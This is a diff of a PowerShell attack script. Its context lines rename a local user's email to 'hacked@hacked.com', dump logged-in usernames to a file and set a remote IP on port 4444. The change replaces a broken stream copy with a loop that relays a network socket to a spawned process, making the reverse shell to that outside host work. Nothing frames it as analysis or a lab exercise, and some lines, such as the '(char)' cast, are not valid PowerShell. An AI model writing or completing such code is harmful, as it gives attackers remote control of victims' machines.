@@ -9,9 +9,6 @@ Set-LocalUser -Name "hacked" -EmailAddress "hacked@hacked.com"
 
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"
 
-
-
-# Define the IP and port
 $ip = "217.160.74.6"
 $port = 4444
 
@@ -33,8 +30,15 @@ $process.StartInfo.RedirectStandardOutput = $true
 $process.Start()
 
 # Redirect the input and output streams
-$stream.Write($process.StandardInput.BaseStream, 0, $process.StandardInput.BaseStream.Length)
-$stream.Read($process.StandardOutput.BaseStream, 0, $process.StandardOutput.BaseStream.Length)
+while ($true) {
+    $input = $stream.ReadByte()
+    if ($input -eq -1) { break }
+    $process.StandardInput.Write((char)$input)
+    $process.StandardInput.Flush()
+    $output = $process.StandardOutput.BaseStream.ReadByte()
+    $stream.Write($output, 0, 1)
+    $stream.Flush()
+}
 
 # Close the streams and the process
 $stream.Close()
